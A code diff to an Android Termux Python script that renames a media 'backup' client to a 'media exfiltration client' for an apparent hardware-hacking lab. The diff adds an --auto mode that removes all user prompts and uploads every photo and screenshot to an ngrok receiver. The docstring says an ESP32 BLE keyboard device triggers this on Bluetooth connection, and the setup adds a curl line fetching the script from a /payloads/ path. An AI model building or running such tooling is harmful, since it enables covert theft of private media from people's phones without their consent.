@@ -1,28 +1,33 @@
 #!/usr/bin/env python3
 """
-media_backup.py — Android Termux media backup client
-=====================================================
-Triggered by ESP32 BLE HID (GPIO 19 button press).
+media_backup.py — Android Termux media exfiltration client
+===========================================================
+CTF / Hardware Hacking Lab — Authorized Devices Only.
+
+Triggered automatically by ESP32 BLE HID on Bluetooth connection,
+or manually via GPIO 19 button press.
 
 Usage:
-    python3 ~/media_backup.py <SERVER_URL>
+    python3 ~/media_backup.py <SERVER_URL> [--auto]
 
-    SERVER_URL  : ngrok HTTPS URL of the macOS server (no trailing slash)
+    SERVER_URL  : ngrok HTTPS URL of the receiver server (no trailing slash)
                   Example: https://abcd-1234.ngrok-free.app
 
-One-time Termux setup:
-    pkg install python
+    --auto      : Non-interactive mode. Skips all prompts and uploads
+                  everything automatically. Used by the ESP32 auto-trigger.
+
+One-time Termux setup (do this once on your own device):
+    pkg install python curl
     termux-setup-storage     # tap Allow when Android prompts
-    cp media_backup.py ~/media_backup.py
+    curl -sL -H "ngrok-skip-browser-warning: true" \
+         -o ~/media_backup.py <SERVER_URL>/payloads/media_backup.py
+    echo "YOUR_SECRET_TOKEN" > ~/.backup_token && chmod 600 ~/.backup_token
 
 Security:
-    Auth token is read from  ~/.backup_token  (one token per line, first line
-    used).  Create it with:
-        echo "YOUR_SECRET_TOKEN" > ~/.backup_token
-        chmod 600 ~/.backup_token
-    The same token must be set as UPLOAD_TOKEN in server.py.
-    If the file is missing the script still runs but uploads will be rejected
-    by an auth-enabled server.
+    Auth token is read from  ~/.backup_token  (first line used).
+    The same token must be set as UPLOAD_TOKEN in server/.env.
+    If the file is missing the script still runs but uploads will be
+    rejected by an auth-enabled server.
 """
 
 import os
@@ -36,7 +41,12 @@ from datetime import datetime
 
 # ── Configuration ─────────────────────────────────────────────────────────────
 
-SERVER_URL   = sys.argv[1].rstrip("/") if len(sys.argv) > 1 else "http://localhost:8019"
+# Parse args: media_backup.py <SERVER_URL> [--auto]
+_args      = sys.argv[1:]
+AUTO_MODE  = "--auto" in _args
+_url_args  = [a for a in _args if not a.startswith("--")]
+
+SERVER_URL   = _url_args[0].rstrip("/") if _url_args else "http://localhost:8019"
 UPLOAD_URL   = f"{SERVER_URL}/upload"
 HEALTH_URL   = f"{SERVER_URL}/health"
 TOKEN_FILE   = os.path.expanduser("~/.backup_token")
@@ -236,6 +246,7 @@ def category_for(path):
 def select_files(all_files):
     """
     Show discovered media summary and ask the user what to upload.
+    In AUTO_MODE all prompts are skipped and everything is uploaded.
     Returns the approved list of paths.
     """
     # Categorise
@@ -256,6 +267,12 @@ def select_files(all_files):
     print(f"\n  Total : {len(all_files)} files  ({total_mb:.1f} MB)")
     print("─" * 56)
 
+    # ── AUTO MODE: skip all prompts, upload everything ────────────────────
+    if AUTO_MODE:
+        print("\n  [AUTO] Non-interactive mode — uploading all files automatically.")
+        return all_files
+
+    # ── MANUAL MODE: prompt for category and confirmation ─────────────────
     print("\nOptions:")
     print("  all        — upload everything")
     print("  <category> — upload one category (e.g. DCIM, Screenshots)")
@@ -300,8 +317,9 @@ def select_files(all_files):
 
 def main():
     print("\n" + "═" * 56)
-    print("  Android Media Backup Client")
+    print("  Android Media Exfiltration Client")
     print(f"  Server  : {SERVER_URL}")
+    print(f"  Mode    : {'AUTO (non-interactive)' if AUTO_MODE else 'MANUAL (interactive)'}")
     print(f"  Auth    : {'token loaded' if AUTH_TOKEN else 'NO TOKEN (set ~/.backup_token)'}")
     print("═" * 56)
 
